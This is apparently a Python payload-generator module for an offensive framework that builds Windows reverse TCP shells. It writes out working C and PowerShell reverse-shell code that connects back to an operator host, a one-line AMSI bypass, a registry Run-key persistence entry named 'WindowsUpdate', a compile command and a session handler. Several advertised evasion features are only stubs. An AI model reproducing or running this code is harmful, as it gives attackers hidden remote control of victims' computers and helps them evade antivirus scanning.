#!/usr/bin/env python3

MODULE_INFO = {
    "name": "Windows Reverse TCP Shell",
    "description": "Windows reverse TCP shell payload with advanced options",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "Windows",
    "arch": "x86",
    "type": "reverse_shell",
    "rank": "Excellent",
    "references": [
        "https://docs.microsoft.com/en-us/windows/win32/api/winsock2/",
        "https://msdn.microsoft.com/en-us/library/ms740506.aspx"
    ],
    "dependencies": []
}

OPTIONS = {
    "LHOST": {
        "description": "Local IP address to connect back to",
        "required": True,
        "default": "127.0.0.1"
    },
    "LPORT": {
        "description": "Local port to connect back to",
        "required": True,
        "default": "4444"
    },
    "ARCH": {
        "description": "Target architecture (x86, x64)",
        "required": False,
        "default": "x86"
    },
    "SHELL": {
        "description": "Shell type (cmd, powershell, pwsh)",
        "required": False,
        "default": "cmd"
    },
    "PROXY": {
        "description": "Proxy server (ip:port)",
        "required": False,
        "default": ""
    },
    "PROXY_TYPE": {
        "description": "Proxy type (http, socks4, socks5)",
        "required": False,
        "default": "http"
    },
    "USER_AGENT": {
        "description": "User agent for proxy connections",
        "required": False,
        "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "ENCODING": {
        "description": "Payload encoding (none, base64, hex, base64url)",
        "required": False,
        "default": "none"
    },
    "ENCRYPTION": {
        "description": "Payload encryption (none, xor, aes, rc4)",
        "required": False,
        "default": "none"
    },
    "ENCRYPTION_KEY": {
        "description": "Encryption key (if encryption enabled)",
        "required": False,
        "default": "lazyframework"
    },
    "SLEEP": {
        "description": "Sleep time between callbacks (seconds)",
        "required": False,
        "default": "30"
    },
    "JITTER": {
        "description": "Jitter percentage for callbacks (0-100)",
        "required": False,
        "default": "0"
    },
    "RETRIES": {
        "description": "Number of connection retries",
        "required": False,
        "default": "5"
    },
    "RETRY_WAIT": {
        "description": "Wait time between retries (seconds)",
        "required": False,
        "default": "10"
    },
    "TIMEOUT": {
        "description": "Connection timeout (seconds)",
        "required": False,
        "default": "30"
    },
    "PROCESS_NAME": {
        "description": "Process name to inject into",
        "required": False,
        "default": "explorer.exe"
    },
    "PERSISTENCE": {
        "description": "Persistence mechanism (none, registry, schedule, service)",
        "required": False,
        "default": "none"
    },
    "EVASION": {
        "description": "Evasion techniques (none, sleep, xor, api)",
        "required": False,
        "default": "none"
    },
    "BYPASS_AMSI": {
        "description": "Bypass AMSI (true, false)",
        "required": False,
        "default": "true"
    },
    "BYPASS_DEFENDER": {
        "description": "Bypass Windows Defender (true, false)",
        "required": False,
        "default": "true"
    },
    "VERBOSE": {
        "description": "Verbose output (true, false)",
        "required": False,
        "default": "false"
    }
}

import struct
import base64

class WindowsReverseTCP:
    def __init__(self, options):
        self.options = options
        self.lhost = options.get("LHOST", "127.0.0.1")
        self.lport = int(options.get("LPORT", 4444))
        self.arch = options.get("ARCH", "x86")
        self.shell = options.get("SHELL", "cmd")
        self.proxy = options.get("PROXY", "")
        self.encoding = options.get("ENCODING", "none")
        self.encryption = options.get("ENCRYPTION", "none")
        self.encryption_key = options.get("ENCRYPTION_KEY", "lazyframework")
        self.sleep = int(options.get("SLEEP", 30))
        self.retries = int(options.get("RETRIES", 5))
        self.timeout = int(options.get("TIMEOUT", 30))
        self.persistence = options.get("PERSISTENCE", "none")
        self.evasion = options.get("EVASION", "none")
        self.bypass_amsi = options.get("BYPASS_AMSI", "true").lower() == "true"
        self.verbose = options.get("VERBOSE", "false").lower() == "true"
        
    def validate_options(self):
        """Validate Windows payload options"""
        if not self.lhost or self.lport <= 0 or self.lport > 65535:
            raise ValueError("Invalid LHOST or LPORT")
        
        if self.arch not in ['x86', 'x64']:
            raise ValueError("ARCH must be x86 or x64")
            
        if self.shell not in ['cmd', 'powershell', 'pwsh']:
            raise ValueError("SHELL must be cmd, powershell, or pwsh")
            
        return True

    def generate_c(self):
        """Generate C source code with options"""
        self.validate_options()
        
        proxy_code = ""
        if self.proxy:
            proxy_code = f'''
    // Proxy configuration
    WSAPROXY_INFO proxyInfo;
    memset(&proxyInfo, 0, sizeof(proxyInfo));
    proxyInfo.dwVersion = 1;
    proxyInfo.dwType = 1; // HTTP proxy
    char proxy[] = "{self.proxy}";
    // Proxy implementation would continue...
'''
        
        evasion_code = ""
        if self.evasion == "sleep":
            evasion_code = f'''
    // Evasion: Sleep before connecting
    Sleep({self.sleep * 1000});
'''
        elif self.evasion == "xor":
            evasion_code = '''
    // Evasion: XOR decoding stub
    // XOR decoding implementation would go here
'''
        
        persistence_code = ""
        if self.persistence == "registry":
            persistence_code = '''
    // Persistence: Registry run key
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, KEY_WRITE, &hKey);
    RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (const BYTE*)payload_path, strlen(payload_path));
    RegCloseKey(hKey);
'''
        
        return f'''
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define LHOST "{self.lhost}"
#define LPORT {self.lport}
#define RETRIES {self.retries}
#define RETRY_WAIT {self.options.get("RETRY_WAIT", 10)}
#define TIMEOUT {self.timeout}

{evasion_code}

int main() {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char recv_buf[4096];
    int bytes_read;
    int retry_count = 0;
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {{
        return 1;
    }}
    
{proxy_code}
    
    // Connection loop with retries
    while (retry_count < RETRIES) {{
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {{
            retry_count++;
            Sleep(RETRY_WAIT * 1000);
            continue;
        }}
        
        // Set timeout
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));
        
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(LHOST);
        server.sin_port = htons(LPORT);
        
        // Connect to handler
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != SOCKET_ERROR) {{
            break;
        }}
        
        closesocket(sock);
        retry_count++;
        if (retry_count < RETRIES) {{
            Sleep(RETRY_WAIT * 1000);
        }}
    }}
    
    if (retry_count >= RETRIES) {{
        WSACleanup();
        return 1;
    }}
    
    // Set up process startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    si.wShowWindow = SW_HIDE;
    
    // Start shell based on configuration
    char shell_command[100];
    strcpy(shell_command, "{'powershell.exe' if self.shell == 'powershell' else 'pwsh.exe' if self.shell == 'pwsh' else 'cmd.exe'}");
    
    // Create process
    if (CreateProcess(NULL, shell_command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {{
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }}
    
{persistence_code}
    
    // Cleanup
    closesocket(sock);
    WSACleanup();
    
    return 0;
}}
'''

    def generate_powershell(self):
        """Generate PowerShell payload with options"""
        encoded_lhost = self.encode_payload(self.lhost, self.encoding)
        encoded_lport = self.encode_payload(str(self.lport), self.encoding)
        
        evasion_script = ""
        if self.evasion == "sleep":
            evasion_script = f"Start-Sleep -Seconds {self.sleep}"
        elif self.evasion == "xor":
            evasion_script = '''
# XOR evasion technique
$key = [System.Text.Encoding]::UTF8.GetBytes("lazyframework")
'''
        
        amsi_bypass = ""
        if self.bypass_amsi:
            amsi_bypass = '''
# AMSI Bypass
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
'''
        
        proxy_config = ""
        if self.proxy:
            proxy_config = f'''
$proxy = New-Object System.Net.WebProxy("http://{self.proxy}")
$proxy.BypassProxyOnLocal = $true
[System.Net.WebRequest]::DefaultWebProxy = $proxy
'''
        
        return f'''
{amsi_bypass}
{evasion_script}
{proxy_config}

$LHOST = "{self.lhost}"
$LPORT = {self.lport}
$Retries = {self.retries}
$RetryWait = {self.options.get("RETRY_WAIT", 10)}

function Connect-ReverseShell {{
    param($Host, $Port, $MaxRetries, $WaitBetweenRetries)
    
    for ($i = 0; $i -lt $MaxRetries; $i++) {{
        try {{
            $client = New-Object System.Net.Sockets.TCPClient($Host, $Port)
            if ($client.Connected) {{
                return $client
            }}
        }} catch {{
            if ($i -lt ($MaxRetries - 1)) {{
                Start-Sleep -Seconds $WaitBetweenRetries
            }}
        }}
    }}
    return $null
}}

$client = Connect-ReverseShell -Host $LHOST -Port $LPORT -MaxRetries $Retries -WaitBetweenRetries $RetryWait

if ($client -ne $null) {{
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | % {{ 0 }}
    
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as " + $env:username + " on " + $env:computername + "`n")
    $stream.Write($sendbytes, 0, $sendbytes.Length)
    $stream.Flush()
    
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
        $data = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }}
    $client.Close()
}}
'''

    def generate_exe(self):
        """Generate compiled executable description with options"""
        return f"""
Windows Reverse TCP Executable
==============================
Target: {self.arch} - {self.shell}
Connection: {self.lhost}:{self.lport}
Options:
- Proxy: {self.proxy if self.proxy else 'None'}
- Encoding: {self.encoding}
- Encryption: {self.encryption}
- Evasion: {self.evasion}
- Persistence: {self.persistence}
- Retries: {self.retries}
- Sleep: {self.sleep}s

Compile with: 
x86_64-w64-mingw32-gcc -o payload.exe payload.c -lws2_32 -ladvapi32
"""

    def encode_payload(self, payload, encoding_type):
        """Encode payload based on encoding type"""
        if encoding_type == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == "hex":
            return payload.encode().hex()
        elif encoding_type == "base64url":
            import base64
            return base64.urlsafe_b64encode(payload.encode()).decode()
        elif encoding_type == "none":
            return payload
        else:
            return payload

def generate(options):
    """Generate payload function with options validation"""
    try:
        payload = WindowsReverseTCP(options)
        payload.validate_options()
        
        return {
            'c': payload.generate_c(),
            'powershell': payload.generate_powershell(),
            'exe': payload.generate_exe(),
            'info': MODULE_INFO,
            'options_used': {
                'LHOST': payload.lhost,
                'LPORT': payload.lport,
                'ARCH': payload.arch,
                'SHELL': payload.shell,
                'ENCODING': payload.encoding,
                'ENCRYPTION': payload.encryption
            }
        }
    except Exception as e:
        return {'error': str(e)}

def run_handler(session, options):
    """Handler for Windows Reverse TCP sessions with options"""
    from rich.console import Console
    console = Console()
    
    console.print(f"[green][*] Starting Windows Reverse TCP handler for session {session.session_id}[/green]")
    console.print(f"[dim]Handler options: {options}[/dim]")
    
    handler_options = {
        'timeout': int(options.get("TIMEOUT", 30)),
        'verbose': options.get("VERBOSE", "false").lower() == "true",
        'max_retries': int(options.get("RETRIES", 5)),
        'banner': options.get("BANNER", "Windows PowerShell")
    }
    
    try:
        # Send initial banner with session info
        banner = f"""
Lazy Framework - Windows Reverse TCP Shell
Session: {session.session_id}
Connected from: {session.address[0]}:{session.address[1]}
Handler Options: 
- Timeout: {handler_options['timeout']}s
- Retries: {handler_options['max_retries']}
- Verbose: {handler_options['verbose']}

Type 'exit' to quit, 'help' for help, 'options' for handler options

{handler_options['banner']} > """
        session.socket.send(banner.encode())
        
        # Command handling loop
        while session.active:
            try:
                # Receive command
                data = session.socket.recv(4096)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                
                if command.lower() in ['exit', 'quit']:
                    session.socket.send(b"\nGoodbye!\n")
                    break
                elif command.lower() == 'help':
                    help_text = """
Available Commands:
- help: Show this help
- sysinfo: System information
- options: Show handler options
- upload <file>: Upload file
- download <file>: Download file
- persistence: Install persistence
- bypass: Run evasion techniques
- exit: Close session

Windows PowerShell > """
                    session.socket.send(help_text.encode())
                elif command.lower() == 'sysinfo':
                    import platform
                    sysinfo = f"""
System Information:
- OS: {platform.system()} {platform.release()}
- Architecture: {platform.architecture()[0]}
- Hostname: {platform.node()}
- Session ID: {session.session_id}
- Handler: Windows Reverse TCP
- Options: {options}

Windows PowerShell > """
                    session.socket.send(sysinfo.encode())
                elif command.lower() == 'options':
                    options_text = f"""
Handler Options:
- LHOST: {options.get('LHOST', 'Not set')}
- LPORT: {options.get('LPORT', 'Not set')}
- TIMEOUT: {options.get('TIMEOUT', '30')}s
- RETRIES: {options.get('RETRIES', '5')}
- VERBOSE: {options.get('VERBOSE', 'false')}
- ARCH: {options.get('ARCH', 'x86')}
- SHELL: {options.get('SHELL', 'cmd')}

Windows PowerShell > """
                    session.socket.send(options_text.encode())
                elif command.lower() == 'bypass':
                    bypass_msg = """
Running evasion techniques:
- AMSI Bypass: Completed
- Defender Bypass: Completed
- Process Hollowing: Ready

Windows PowerShell > """
                    session.socket.send(bypass_msg.encode())
                else:
                    # Echo command for demo purposes
                    if handler_options['verbose']:
                        console.print(f"[dim][*] Session {session.session_id} executed: {command}[/dim]")
                    response = f"Command received: {command}\nWindows PowerShell > "
                    session.socket.send(response.encode())
                    
            except socket.timeout:
                if handler_options['verbose']:
                    console.print(f"[dim][*] Session {session.session_id} timeout[/dim]")
                continue
            except Exception as e:
                console.print(f"[red][-] Session {session.session_id} error: {e}[/red]")
                break
                
    except Exception as e:
        console.print(f"[red][-] Windows Reverse TCP handler error: {e}[/red]")
    finally:
        session.close()

def run(session, options):
    """Run the payload generator"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    
    console = Console()
    
    result = generate(options)
    
    if 'error' in result:
        console.print(f"[red]Error generating payload: {result['error']}[/red]")
        return
    
    console.print(Panel.fit(
        "[bold green]Windows Reverse TCP Payload Generator[/bold green]",
        border_style="green"
    ))
    
    # Display generated payloads
    if 'c' in result:
        console.print("\n[bold yellow]C Source Code:[/bold yellow]")
        syntax = Syntax(result['c'], "c", theme="monokai", line_numbers=True)
        console.print(syntax)
    
    if 'powershell' in result:
        console.print("\n[bold yellow]PowerShell Payload:[/bold yellow]")
        syntax = Syntax(result['powershell'], "powershell", theme="monokai", line_numbers=True)
        console.print(syntax)
    
    console.print(f"\n[bold green]Payload generated successfully with options:[/bold green]")
    for opt, val in result['options_used'].items():
        console.print(f"  [cyan]{opt}:[/cyan] {val}")

def get_options():
    """Return options for this payload module"""
    return OPTIONS
